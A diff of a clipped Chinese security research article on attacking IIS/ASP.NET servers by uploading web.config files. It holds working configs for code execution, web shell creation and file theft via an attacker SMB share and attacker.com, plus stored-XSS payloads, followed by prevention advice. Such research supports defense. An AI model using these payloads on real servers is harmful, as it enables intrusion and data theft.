@@ -1,5 +1,5 @@
 ---
-title: web.config文件上传技术研究 - 先知社区
+title: web.config 文件上传技术研究 - 先知社区
 url: https://xz.aliyun.com/t/6037?u_atoken=0d5967f74b7760e82a094a831e88966d&u_asession=01RvUVfjuRtBzraQD7QZ6I0ETe5oRZP8v01HcUtsGa4OTYoQUE2u7YgF6bJh-ijDk1dlmHJsN3PcAI060GRB4YZGyPlBJUEqctiaTooWaXr7I&u_asig=05UdmghwEe4WDlOk7P10hOxtCeZ5ugcC0OC6vabBr5A3mQuC-gq83vuD6UR6ria7QPyepSJ3VPh-VkEE7Mb6lsGFqSAMcSuzzdgTtnzJwJfvHVw83kqY6F0NPaqn55NPI1x-UOa4oCwnDU0x9oB0GYP5FoEzPxuE8c-M70feUMT3Bg2QMxYs6lyXb1lFWKql56zuZ0E23lDS6MeNc7f4fomEZNQ-PZrScrF4S1G-JLOOavQ-Qb09Iuf18iKv3tmx01Z_E9PMW7-9-tfaLvRGH3thzLBjGFUnn_Jz5VAc7iB4N6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=pQ84vLEULUi6ouI8bgaEEylpbVw%3D
 clipped_at: 2024-03-28 00:11:55
 category: default
@@ -8,19 +8,19 @@ tags:
 ---
 
 
-# web.config文件上传技术研究 - 先知社区
+# web.config 文件上传技术研究 - 先知社区
 
 ### 介绍
 
-这是我上传`web.config`系列文章中的第二篇，我在2014年完成了第一篇该系列的相关文章，在那篇文章中我描述了一种运行`ASP`的经典代码方法，即通过上传`web.config`文件来执行存储型XSS攻击。
+这是我上传`web.config`系列文章中的第二篇，我在 2014 年完成了第一篇该系列的相关文章，在那篇文章中我描述了一种运行`ASP`的经典代码方法，即通过上传`web.config`文件来执行存储型 XSS 攻击。
 
-在这篇文章中，我们专注于运行`web.config`文件本身，我在上一篇文章中介绍过如何在IIS上的应用程序中上传web.config技术。而本文中我的主要是使用`web.config`文件在服务器上执行代码或命令，并使用了技巧来利用存储型XSS。
+在这篇文章中，我们专注于运行`web.config`文件本身，我在上一篇文章中介绍过如何在 IIS 上的应用程序中上传 web.config 技术。而本文中我的主要是使用`web.config`文件在服务器上执行代码或命令，并使用了技巧来利用存储型 XSS。
 
-此处描述的技术分为两大类，其具体取决于是否可以在应用程序根目录或子文件夹、虚拟目录中上载`web.config`文件。 如果不熟悉IIS中的虚拟目录和应用程序术语，请[参阅](https://docs.microsoft.com/en-us/iis/get-started/planning-your-iis-architecture/understanding-sites-applications-and-virtual-directories-on-iis)。
+此处描述的技术分为两大类，其具体取决于是否可以在应用程序根目录或子文件夹、虚拟目录中上载`web.config`文件。如果不熟悉 IIS 中的虚拟目录和应用程序术语，请[参阅](https://docs.microsoft.com/en-us/iis/get-started/planning-your-iis-architecture/understanding-sites-applications-and-virtual-directories-on-iis)。
 
-### 1.使用根目录或应用程序目录中的web.config执行命令
+### 1.使用根目录或应用程序目录中的 web.config 执行命令
 
-此方法非常具有破坏性，因为应用程序已经使用了将替换为我们的`web.config`文件。然而该文件没有所有必需的设置，例如数据库连接字符串或一些有效的程序集的引用。 当应用程序可能使用了将要替换的`web.config`文件时，建议不要在实时网站上使用此技术。 位于其他应用程序或虚拟目录中的IIS应用程序可能不使用`web.config`文件，通常比网站的根目录更安全。 下面的图中显示了`testwebconfig`应用程序中的内部应用程序anotherapp的示例，该应用程序也位于默认网站内。
+此方法非常具有破坏性，因为应用程序已经使用了将替换为我们的`web.config`文件。然而该文件没有所有必需的设置，例如数据库连接字符串或一些有效的程序集的引用。当应用程序可能使用了将要替换的`web.config`文件时，建议不要在实时网站上使用此技术。位于其他应用程序或虚拟目录中的 IIS 应用程序可能不使用`web.config`文件，通常比网站的根目录更安全。下面的图中显示了`testwebconfig`应用程序中的内部应用程序 anotherapp 的示例，该应用程序也位于默认网站内。
 
 [![](assets/1711555915-271a6c53b042dddf4a597752f44b5bb4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190818001121-a77146a4-c109-1.png)
 
@@ -28,9 +28,9 @@ tags:
 
 我在这篇博文中列出了四个例子，如下所示。
 
-#### 1.1 将web.config作为ASPX页面执行
+#### 1.1 将 web.config 作为 ASPX 页面执行
 
-这与第一篇文中提到的技术非常相似，但是当我们在应用程序的根目录中上传`web.config`文件时，我们有更多的控制权，我们可以使用托管处理程序将`web.config`文件作为`ASPX`页面运行。 以下`web.config`文件显示了一个示例：
+这与第一篇文中提到的技术非常相似，但是当我们在应用程序的根目录中上传`web.config`文件时，我们有更多的控制权，我们可以使用托管处理程序将`web.config`文件作为`ASPX`页面运行。以下`web.config`文件显示了一个示例：
 
 ```plain
 <?xml version="1.0" encoding="UTF-8"?>
@@ -71,11 +71,11 @@ Response.write("<!-"&"-")
 -->
 ```
 
-之后我们可以浏览`web.config`文件以将其作为`ASP.NET`页面运行。 然而`XML`内容也可以从网上访问。 也许更容易上传另一个带有允许扩展名的文件，例如`.config`、`.jpg`或`.txt`文件，并将其作为`.aspx`页面运行。
+之后我们可以浏览`web.config`文件以将其作为`ASP.NET`页面运行。然而`XML`内容也可以从网上访问。也许更容易上传另一个带有允许扩展名的文件，例如`.config`、`.jpg`或`.txt`文件，并将其作为`.aspx`页面运行。
 
-#### 1.2 使用AspNetCoreModule运行命令
+#### 1.2 使用 AspNetCoreModule 运行命令
 
-我们也可以使用ASP.NET核心模块运行命令，如下所示：
+我们也可以使用 ASP.NET 核心模块运行命令，如下所示：
 
 ```plain
 <?xml version="1.0" encoding="utf-8"?>
@@ -96,7 +96,7 @@ Response.write("<!-"&"-")
 
 [https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/中所述，可以在\`web.config\`文件中设置\`machineKey\`元素，以滥用反序列化功能在服务器上运行代码和命令。](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/%E4%B8%AD%E6%89%80%E8%BF%B0%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%9C%A8%60web.config%60%E6%96%87%E4%BB%B6%E4%B8%AD%E8%AE%BE%E7%BD%AE%60machineKey%60%E5%85%83%E7%B4%A0%EF%BC%8C%E4%BB%A5%E6%BB%A5%E7%94%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8A%9F%E8%83%BD%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E8%BF%90%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%92%8C%E5%91%BD%E4%BB%A4%E3%80%82)
 
-#### 1.4 使用JSON\_AppService.axd
+#### 1.4 使用 JSON\_AppService.axd
 
 这是在`.NET Framework`中使用已知的反序列化问题在服务器上运行代码的一种方式。
 
@@ -127,7 +127,7 @@ Response.write("<!-"&"-")
 </configuration>
 ```
 
-以下JSON显示攻击者网站`（http://attacker.com/payload）`上应该接受POST请求的payload页面：
+以下 JSON 显示攻击者网站`（http://attacker.com/payload）`上应该接受 POST 请求的 payload 页面：
 
 ```plain
 {
@@ -144,7 +144,7 @@ Response.write("<!-"&"-")
 }
 ```
 
-上传`web.config`文件并在远程服务器上设置payload页面后，攻击者可以发送以下HTTP请求以在服务器上运行其代码和命令：
+上传`web.config`文件并在远程服务器上设置 payload 页面后，攻击者可以发送以下 HTTP 请求以在服务器上运行其代码和命令：
 
 ```plain
 POST /testwebconfig/Authentication_JSON_AppService.axd/login HTTP/1.1
@@ -157,11 +157,11 @@ Content-Type: application/json;charset=UTF-8
 
 应该注意的是，`Profile_JSON_AppService.axd`或`Role_JSON_AppService.axd`也可能在这里派上用场，但是需要在`web.config`中启用它们，并且需要调用合适的方法来触发反序列化。
 
-### 2.使用子文件夹或虚拟目录中的web.config执行命令
+### 2.使用子文件夹或虚拟目录中的 web.config 执行命令
 
-虚拟目录中的`web.config`文件比应用程序文件夹根目录中的`web.config`更受限制。 可以滥用以执行`AspNetCoreModule，machineKey，buildProviders和httpHandler`等命令不能在子文件夹中的web.config中使用。
+虚拟目录中的`web.config`文件比应用程序文件夹根目录中的`web.config`更受限制。可以滥用以执行`AspNetCoreModule，machineKey，buildProviders和httpHandler`等命令不能在子文件夹中的 web.config 中使用。
 
-在我之前在2014年发表的相关博客文章中，我发现了一种方法，当允许在虚拟目录中使用`ISAPI`模块时，将`web.config`文件作为`ASP`文件运行。如下所示：
+在我之前在 2014 年发表的相关博客文章中，我发现了一种方法，当允许在虚拟目录中使用`ISAPI`模块时，将`web.config`文件作为`ASP`文件运行。如下所示：
 
 ```plain
 <?xml version="1.0" encoding="UTF-8"?>
@@ -192,11 +192,11 @@ Response.write("<!-"&"-")
 -->
 ```
 
-其他模块（例如用于PHP的模块）也可以在允许时进行类似地使用。 但是，在正确配置IIS应用程序时，我们通常无法运行除`.NET`代码之外的任何内容。 因此，我将引入更多技术。
+其他模块（例如用于 PHP 的模块）也可以在允许时进行类似地使用。但是，在正确配置 IIS 应用程序时，我们通常无法运行除`.NET`代码之外的任何内容。因此，我将引入更多技术。
 
-#### 2.1 错误使用compilerOptions属性
+#### 2.1 错误使用 compilerOptions 属性
 
-我将使用以下web.config文件作为基本模板：
+我将使用以下 web.config 文件作为基本模板：
 
 ```plain
 <?xml version="1.0" encoding="UTF-8"?>
@@ -252,13 +252,13 @@ Microsoft.CSharp.CSharpCodeProvider,System, Version=4.0.0.0, Culture=neutral, Pu
 
 这使用`csc.exe`命令进行编译。
 
-VB.NET：
+VB.NET:
 
 ```plain
 Microsoft.VisualBasic.VBCodeProvider, System, Version=2.0.3600.0, Culture=neutral, PublicKeyToken=b77a5c561934e089
 ```
 
-使用vbc.exe命令进行编译。
+使用 vbc.exe 命令进行编译。
 
 Jscript.NET:
 
@@ -268,7 +268,7 @@ Microsoft.JScript.JScriptCodeProvider, Microsoft.JScript, Version=7.0.3300.0, Cu
 
 这使用`jsc.exe`命令进行编译。
 
-这些命令通常可以在`.NET`文件夹中找到。 对于`.NET v4`，该文件夹将是：
+这些命令通常可以在`.NET`文件夹中找到。对于`.NET v4`，该文件夹将是：
 
 ```plain
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\
@@ -284,7 +284,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\
 
 应该注意的是，如果`ASP.NET`页面存在于上传`web.config`文件的同一文件夹中，则在我们更改编译过程时，它们将使用我在此提供的示例进行工作。因此，如果只有一次上传`web.config`文件并且无法再次重写时，我们应该注意该文件的内容，确保`web.config`有效。
 
-##### 2.1.1 创建Web shell
+##### 2.1.1 创建 Web shell
 
 以下字符串显示了`compilerOptions`属性，该属性可用于在`Web`目录中创建包含一些二进制数据的`Web shell`：
 
@@ -292,7 +292,7 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\
 /resource:"\\KaliBoxIP\Public\webshell.txt" /out:"C:\appdata\wwwroot\myapp\webshell.aspx" #
 ```
 
-使用上述设置浏览`web.config`文件后，将在请求的路径中创建具有`webshell.aspx`名称的二进制文件。 在此处了解服务器上的应用程序路径非常重要。 当显示`ASP.NET`失败的错误消息时，可以简单地通过错误来显示应用程序的路径。 建议在另一个文件而不是`web.config`文件本身中创建一个错误，但是如果以后可以修改它，这里只是一个`web.config`文件，它只显示一个错误：
+使用上述设置浏览`web.config`文件后，将在请求的路径中创建具有`webshell.aspx`名称的二进制文件。在此处了解服务器上的应用程序路径非常重要。当显示`ASP.NET`失败的错误消息时，可以简单地通过错误来显示应用程序的路径。建议在另一个文件而不是`web.config`文件本身中创建一个错误，但是如果以后可以修改它，这里只是一个`web.config`文件，它只显示一个错误：
 
 ```plain
 <?xml version="1.0" encoding="UTF-8"?>
@@ -306,9 +306,9 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\
 
 除了可以在创建`Web shell`之后更改`web.config`文件以删除`compilerOptions`属性以允许正常的编译过程之外，还应该在我们的`web.config`文件上传之外创建`Web shell`。
 
-应该注意的是，`webshell.txt`中的代码将嵌入到包含二进制数据的`webshell.aspx`的中间。 由于这不是`webshell`的副本，因此可以用作获取访问权限的第一阶段。
+应该注意的是，`webshell.txt`中的代码将嵌入到包含二进制数据的`webshell.aspx`的中间。由于这不是`webshell`的副本，因此可以用作获取访问权限的第一阶段。
 
-**无法访问SMB的解决方案**
+**无法访问 SMB 的解决方案**
 
 如果目标无法通过`SMB`进行通信，则可以使用允许的扩展名上载`Web shell`，以将其包含在`/resource`选项中：
 
@@ -316,13 +316,13 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\
 /resource:"C:\appdata\wwwroot\myapp\attachment\myshell.config" /out:"C:\appdata\wwwroot\myapp\webshell.aspx" #
 ```
 
-##### 2.1.2 接管现有的ASPX文件
+##### 2.1.2 接管现有的 ASPX 文件
 
 当`ASPX`文件存在于所上传`web.config`文件的同一文件夹中时，可以修改编译过程进行接管操作。
 
-了解应用程序和虚拟目录对于使用此技术非常重要。 我将使用以下示例解释这一点：
+了解应用程序和虚拟目录对于使用此技术非常重要。我将使用以下示例解释这一点：
 
-`web.config`文件可以在`C:\appdata\wwwroot\myapp\attachment\`上传，`file.aspx`也存在于同一路径中，可通过以下URL访问：
+`web.config`文件可以在`C:\appdata\wwwroot\myapp\attachment\`上传，`file.aspx`也存在于同一路径中，可通过以下 URL 访问：
 
 ```plain
 https://victim.com/myapp/attachment/file.aspx
@@ -382,17 +382,17 @@ namespace ASP
 
 ##### 2.1.3 窃取内部文件
 
-以下字符串显示compilerOptions属性：
+以下字符串显示 compilerOptions 属性：
 
 ```plain
 /resource:c:\windows\win.ini /out:\\KaliBoxIP\Public\test.bin
 ```
 
-在上载文件夹中打开现有ASP.NET页面后，将在包含`win.ini`文件的共享文件夹中创建`test.pdb和test.bin`文件。 这对于获取应用程序的`web.config`文件尤其有用，因为它可能包含敏感数据，例如可以使用远程代码执行的机器密钥。
+在上载文件夹中打开现有 ASP.NET 页面后，将在包含`win.ini`文件的共享文件夹中创建`test.pdb和test.bin`文件。这对于获取应用程序的`web.config`文件尤其有用，因为它可能包含敏感数据，例如可以使用远程代码执行的机器密钥。
 
 ##### 2.1.4 窃取应用的更多数据
 
-以下字符串显示compilerOptions属性：
+以下字符串显示 compilerOptions 属性：
 
 ```plain
 /resource:\\KaliBoxIP\Public\test.txt -bugreport:\\KaliBoxIP\Public\foobar1.txt /errorreport:none
@@ -402,11 +402,11 @@ namespace ASP
 
 [![](assets/1711555915-83046f4327c6889bad2a42b1de8e3f9e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190818001145-b584e318-c109-1.png)
 
-显然，当路径已知并且可以远程下载文件时，也可以在同一Web服务器上创建此文件。
+显然，当路径已知并且可以远程下载文件时，也可以在同一 Web 服务器上创建此文件。
 
-#### 2.2 接管上传的.NET文件
+#### 2.2 接管上传的.NET 文件
 
-以下web.config可用于接管现有的Web服务文件：
+以下 web.config 可用于接管现有的 Web 服务文件：
 
 ```plain
 <?xml version="1.0" encoding="UTF-8"?>
@@ -422,11 +422,11 @@ namespace ASP
 </configuration>
 ```
 
-这将从SMB共享加载webshell.aspx文件，并在打开该文件夹中的ASMX文件时执行它。
+这将从 SMB 共享加载 webshell.aspx 文件，并在打开该文件夹中的 ASMX 文件时执行它。
 
-也可以重新映射.master和.ascx扩展，并像ASMX文件一样使用它们。 上传这些文件的可能性高于其他ASP.NET扩展，例如`.aspx，.asmx，.ashx，.svc和.soap`，它们也可以使用相同的技术接管。
+也可以重新映射.master 和.ascx 扩展，并像 ASMX 文件一样使用它们。上传这些文件的可能性高于其他 ASP.NET 扩展，例如`.aspx，.asmx，.ashx，.svc和.soap`，它们也可以使用相同的技术接管。
 
-以下web.config文件显示了可以接管多个文件扩展名的示例：
+以下 web.config 文件显示了可以接管多个文件扩展名的示例：
 
 ```plain
 <?xml version="1.0" encoding="UTF-8"?>
@@ -460,13 +460,13 @@ namespace ASP
 </configuration>
 ```
 
-当`SMB`被阻止时，可能很难使用此技术，因为`wsdlHelpGenerator`元素的href属性中的文件扩展名很重要。
+当`SMB`被阻止时，可能很难使用此技术，因为`wsdlHelpGenerator`元素的 href 属性中的文件扩展名很重要。
 
-#### 2.3 存储XSS
+#### 2.3 存储 XSS
 
-也可以创建存储型XSS。 当其他方法因任何原因不起作用时，这可能很有用。
+也可以创建存储型 XSS。当其他方法因任何原因不起作用时，这可能很有用。
 
-在上文中讨论了通过上传`web.config`文件使应用受XSS攻击的一些方法。 例如，当允许下载某些文件时，可以通过操作mimetypes进行XSS攻击。 以下示例显示.txt文件如何作为`.html`文件运行：
+在上文中讨论了通过上传`web.config`文件使应用受 XSS 攻击的一些方法。例如，当允许下载某些文件时，可以通过操作 mimetypes 进行 XSS 攻击。以下示例显示.txt 文件如何作为`.html`文件运行：
 
 ```plain
 <?xml version="1.0" encoding="utf-8"?>
@@ -480,13 +480,13 @@ namespace ASP
 </configuration>
 ```
 
-在这篇博客文章中，还发现了两个新ASP.NET处理程序。
+在这篇博客文章中，还发现了两个新 ASP.NET 处理程序。
 
-##### 2.3.1 使用State Application处理程序
+##### 2.3.1 使用 State Application 处理程序
 
-StateApplication处理程序是System.Web.SessionState命名空间内的一个内部类，用于缓存并且不应该直接从用户代码调用。 使用任意文本替换任何现有文件的响应可能会被滥用。
+StateApplication 处理程序是 System.Web.SessionState 命名空间内的一个内部类，用于缓存并且不应该直接从用户代码调用。使用任意文本替换任何现有文件的响应可能会被滥用。
 
-以下web.config文件显示了一个示例，使用该示例使用XSS有效内容替换web.config的响应：
+以下 web.config 文件显示了一个示例，使用该示例使用 XSS 有效内容替换 web.config 的响应：
 
 ```plain
 <?xml version="1.0" encoding="UTF-8"?>
@@ -533,7 +533,7 @@ DELETE /testwebconfig/userfiles/web.config HTTP/1.1
 Host: victim.com
 ```
 
-为了使用相同的名称创建多个XSSd payload，可以将其他参数添加到URL。 例如：
+为了使用相同的名称创建多个 XSSd payload，可以将其他参数添加到 URL。例如：
 
 ```plain
 Web.config/payload1
@@ -543,11 +543,11 @@ And
 Web.config?payload2
 ```
 
-##### 2.3.2 使用Discovery Request Handler处理程序
+##### 2.3.2 使用 Discovery Request Handler 处理程序
 
-`System.Web.Services.Discovery`命名空间中的`DiscoveryRequestHandler`类可用于提供XML文件（实际使用中的.disco文件）。 这可能会被利用来从XML响应中执行JavaScript代码。
+`System.Web.Services.Discovery`命名空间中的`DiscoveryRequestHandler`类可用于提供 XML 文件（实际使用中的.disco 文件）。这可能会被利用来从 XML 响应中执行 JavaScript 代码。
 
-如果可以上传`web.config`文件，那么我们也可以上传包含带`JavaScript`代码的XML的`test.config`文件。 以下`web.config`显示了一个示例，`test.config`文件将用作XML文件：
+如果可以上传`web.config`文件，那么我们也可以上传包含带`JavaScript`代码的 XML 的`test.config`文件。以下`web.config`显示了一个示例，`test.config`文件将用作 XML 文件：
 
 ```plain
 <?xml version="1.0" encoding="UTF-8"?>
@@ -577,7 +577,7 @@ Web.config?payload2
 <script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
 ```
 
-我们应该注意`DynamicDiscoveryDocument`类型的XML文件不能用于XSS，因为它将用于搜索当前目录以发现现有Web服务。
+我们应该注意`DynamicDiscoveryDocument`类型的 XML 文件不能用于 XSS，因为它将用于搜索当前目录以发现现有 Web 服务。
 
 ```plain
 <dynamicDiscovery xmlns="urn:schemas-dynamicdiscovery:disco.2000-03-17">
@@ -587,26 +587,26 @@ Web.config?payload2
 
 ### 3 预防技术
 
-第一道防线是使用白名单方法验证文件名，扩展名和内容。 这可以通过仅允许文件扩展名并检查文件内容以确保它们使用有效格式来完成。
+第一道防线是使用白名单方法验证文件名，扩展名和内容。这可以通过仅允许文件扩展名并检查文件内容以确保它们使用有效格式来完成。
 
-另一个建议是将文件保存在Web目录之外或数据库中。 如今更安全的方式是将上传的文件存储在云中，例如在`Amazon S3`中。我们必须确保访问控制检查是合适且有效的，并且实现不会导致其他安全问题，例如不安全的对象引用或路径操作。
+另一个建议是将文件保存在 Web 目录之外或数据库中。如今更安全的方式是将上传的文件存储在云中，例如在`Amazon S3`中。我们必须确保访问控制检查是合适且有效的，并且实现不会导致其他安全问题，例如不安全的对象引用或路径操作。
 
-使用适当的HTTP标头还可以防止跨站点内容劫持攻击。
+使用适当的 HTTP 标头还可以防止跨站点内容劫持攻击。
 
-以下建议也可以通过上传web.config文件来加剧攻击：
+以下建议也可以通过上传 web.config 文件来加剧攻击：
 
 -   使用预编译的应用程序会使脚本小子攻击您的应用程序变得更加困难
     
--   确保Web应用程序中的现有文件没有写入权限，包括web.config文件，尤其是在上传目录之外
+-   确保 Web 应用程序中的现有文件没有写入权限，包括 web.config 文件，尤其是在上传目录之外
     
 -   监控网站上任何动态文件的创建，以检测潜在的攻击
     
 
-如果我们无权访问代码，无法更改文件权限或无法更改应用程序的工作方式，那么仍可以在应用程序路径或网站根目录中使用web.config文件来缓解可能发生的某些攻击，并通过上传web.config文件：
+如果我们无权访问代码，无法更改文件权限或无法更改应用程序的工作方式，那么仍可以在应用程序路径或网站根目录中使用 web.config 文件来缓解可能发生的某些攻击，并通过上传 web.config 文件：
 
-如果可能，请确保禁用虚拟目录中的web.config文件。 这可以通过更改`applicationHost.config`文件中的allowSubDirConfig属性来完成，该文件通常位于`C:\Windows\System32\inetsrv\Config\`
+如果可能，请确保禁用虚拟目录中的 web.config 文件。这可以通过更改`applicationHost.config`文件中的 allowSubDirConfig 属性来完成，该文件通常位于`C:\Windows\System32\inetsrv\Config\`
 
-不应该被子目录中的其他`web.config`文件更改的敏感web.config元素也应该受到保护。 这可以使用web.config文件中的`allowOverride`属性或锁定功能来完成。 以下`web.config`文件显示了一个示例，可以在父目录中使用该示例来锁定在此研究中的某些威胁部分：
+不应该被子目录中的其他`web.config`文件更改的敏感 web.config 元素也应该受到保护。这可以使用 web.config 文件中的`allowOverride`属性或锁定功能来完成。以下`web.config`文件显示了一个示例，可以在父目录中使用该示例来锁定在此研究中的某些威胁部分：
 
 ```plain
 <?xml version="1.0" encoding="utf-8"?>
@@ -642,9 +642,9 @@ Web.config?payload2
 
 #### 4.1 需求与资源
 
-除了时间之外，我研究的主要资源是`ASP.NET Framework`源代码，`Visual Studio，Sysinternals Process Monitor，dnSpy，Telerik JustDecompile，IIS Web`服务器，Kali Linux以及Google搜索。
+除了时间之外，我研究的主要资源是`ASP.NET Framework`源代码，`Visual Studio，Sysinternals Process Monitor，dnSpy，Telerik JustDecompile，IIS Web`服务器，Kali Linux 以及 Google 搜索。
 
-我使用`Kali Linux`主要是为了拥有一个简单的未经身份验证的SMB共享，我可以进行读/写操作。 最终为我提供SMB v3支持的`/etc/samba/smb.conf`文件是：
+我使用`Kali Linux`主要是为了拥有一个简单的未经身份验证的 SMB 共享，我可以进行读/写操作。最终为我提供 SMB v3 支持的`/etc/samba/smb.conf`文件是：
 
 ```plain
 [global]
@@ -673,17 +673,17 @@ directory mode = 0777
 
 #### 4.2 编译器选项
 
-在设置编译器选项时，我们基本上将参数传递给通过@字符传递的文件中的编译器（csc.exe，vbc.exe或jsc.exe）。 虽然命令注入会立刻产生在我们的脑海中，但它是无效的，我无法使用它运行另一个命令。
+在设置编译器选项时，我们基本上将参数传递给通过@字符传递的文件中的编译器（csc.exe，vbc.exe 或 jsc.exe）。虽然命令注入会立刻产生在我们的脑海中，但它是无效的，我无法使用它运行另一个命令。
 
 有两种可能导致命令执行的途径比我在本研究中发现的更容易：
 
 编译特定文件时的代码执行  
 查找可以依次运行代码或命令的参数  
-。 -analyzer选项对于C＃编译器来说非常有前景，但是.NET执行的csc.exe文件中缺少它。
+。 -analyzer 选项对于 C＃编译器来说非常有前景，但是.NET 执行的 csc.exe 文件中缺少它。
 
 #### 4.3 探索新的处理程序
 
-正如在本文中可以看到的那样，识别可以在`web.config`文件中处理的所有HTTP处理程序非常重要。 这是通过搜索实现IHttpHandler，IHttpHandlerFactory和IHttpHandlerFactory2的类来完成的。
+正如在本文中可以看到的那样，识别可以在`web.config`文件中处理的所有 HTTP 处理程序非常重要。这是通过搜索实现 IHttpHandler，IHttpHandlerFactory 和 IHttpHandlerFactory2 的类来完成的。
 
 以下是在浏览器中轻松查看它们的方法：
 
@@ -695,19 +695,19 @@ directory mode = 0777
 
 应该注意的是，有时新的处理程序也可以从实现中派生出来。并且只需要很少的更改。
 
-ASP.NET使用文件扩展名来检测其类型，如果无法获得Web服务所需的正确类型，则需要将新扩展名添加到buildProviders元素中。 但是，buildProviders元素只能由应用程序设置，否则会显示以下错误：
+ASP.NET 使用文件扩展名来检测其类型，如果无法获得 Web 服务所需的正确类型，则需要将新扩展名添加到 buildProviders 元素中。但是，buildProviders 元素只能由应用程序设置，否则会显示以下错误：
 
 ```plain
 The element 'buildProviders' cannot be defined below the application level.
 ```
 
-此保护已在.NET Framework中的CompilationSection.cs的PostDeserialize()方法中编码，而不是在machine.config文件中：
+此保护已在.NET Framework 中的 CompilationSection.cs 的 PostDeserialize() 方法中编码，而不是在 machine.config 文件中：
 
 [https://referencesource.microsoft.com/#System.Web/Configuration/CompilationSection.cs,904](https://referencesource.microsoft.com/#System.Web/Configuration/CompilationSection.cs,904)
 
-有一些方法可以使用预定义的扩展在IIS上执行命令，但本研究的重点是使用可能允许上载的新扩展。
+有一些方法可以使用预定义的扩展在 IIS 上执行命令，但本研究的重点是使用可能允许上载的新扩展。
 
-可以在`ASP.NET`配置文件夹中的主`web.config`中看到预定义的buildProviders列表（例如C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config)）。
+可以在`ASP.NET`配置文件夹中的主`web.config`中看到预定义的 buildProviders 列表（例如 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config)）。
 
 #### 4.4 临时编译的文件
 
@@ -717,9 +717,9 @@ The element 'buildProviders' cannot be defined below the application level.
 C:\Windows\Microsoft.NET\Framework64\[version]\Temporary ASP.NET Files\[appname]\[hash]\[hash]
 ```
 
-其中一些文件将立即被删除，我监视它们的最简单方法是删除我的应用程序使用的临时目录上的所有用户的删除权限。 当不再需要时，可以轻松恢复。
+其中一些文件将立即被删除，我监视它们的最简单方法是删除我的应用程序使用的临时目录上的所有用户的删除权限。当不再需要时，可以轻松恢复。
 
-我们可以在那里创建文件，我们应该能够替换该应用程序的现有文件以在理论上执行服务器上的代码。 在实践中，所有这些文件在其名称中使用随机值，并且需要使用例如要分析文件名来窃取它们。 我还没有研究`.NET Framework`何时创建新的DLL文件，但理论上应该可以重写这些现有的DLL文件来接管应用程序中现有.NET文件。
+我们可以在那里创建文件，我们应该能够替换该应用程序的现有文件以在理论上执行服务器上的代码。在实践中，所有这些文件在其名称中使用随机值，并且需要使用例如要分析文件名来窃取它们。我还没有研究`.NET Framework`何时创建新的 DLL 文件，但理论上应该可以重写这些现有的 DLL 文件来接管应用程序中现有.NET 文件。
 
 ### 参考
 
